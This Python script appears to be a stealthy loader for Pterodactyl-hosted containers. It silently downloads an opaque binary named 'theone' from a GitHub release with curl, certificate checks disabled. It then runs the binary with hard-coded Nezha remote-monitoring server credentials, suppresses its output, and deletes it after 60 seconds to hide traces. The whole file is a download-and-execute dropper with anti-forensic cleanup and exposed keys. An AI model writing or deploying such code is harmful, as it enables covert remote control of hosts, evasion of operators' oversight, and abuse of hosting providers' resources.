import os
import subprocess
import time
import threading
import shutil

CONFIG = {
    "file_name": "theone",
    "download_url": "https://github.com/babama1001980/good/releases/download/npc/theone",
    "tmp_dir": ".tmp",
    "env": {
        "UUID": "faacf142-dee8-48c2-8558-641123eb939c",
        "NEZHA_SERVER": "nezha.mingfei1981.eu.org",
        "NEZHA_PORT": "443",
        "NEZHA_KEY": "HnVNA6BLnNaW19979g"
    }
}

file_path = os.path.join(os.getcwd(), CONFIG["file_name"])
tmp_path = os.path.join(os.getcwd(), CONFIG["tmp_dir"])

def cleanup():
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
        if os.path.exists(tmp_path):
            shutil.rmtree(tmp_path, ignore_errors=True)
    except:
        pass

def download_file():
    try:
        # -s for silent mode
        subprocess.run(["curl", "-L", "-k", "-s", "-o", CONFIG["file_name"], CONFIG["download_url"]], check=True)
    except:
        exit(1)

def self_destruct():
    # Wait for 60 seconds then delete files
    time.sleep(60)
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
        if os.path.exists(tmp_path):
            shutil.rmtree(tmp_path, ignore_errors=True)
    except:
        pass

def start_app():
    try:
        if os.path.exists(file_path):
            os.chmod(file_path, 0o755)
    except:
        pass

    # Merge system env with custom UUID/NEZHA variables
    current_env = os.environ.copy()
    current_env.update(CONFIG["env"])

    try:
        # Use subprocess.DEVNULL to stay silent
        process = subprocess.Popen(
            [f"./{CONFIG['file_name']}"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            env=current_env,
            shell=True
        )

        # Run self-destruct in a background thread
        timer_thread = threading.Thread(target=self_destruct)
        timer_thread.daemon = True
        timer_thread.start()

        # Keep the script alive while the process is running
        # This prevents Pterodactyl from restarting the container
        process.wait()
    except:
        exit(1)

if __name__ == "__main__":
    cleanup()
    download_file()
    start_app()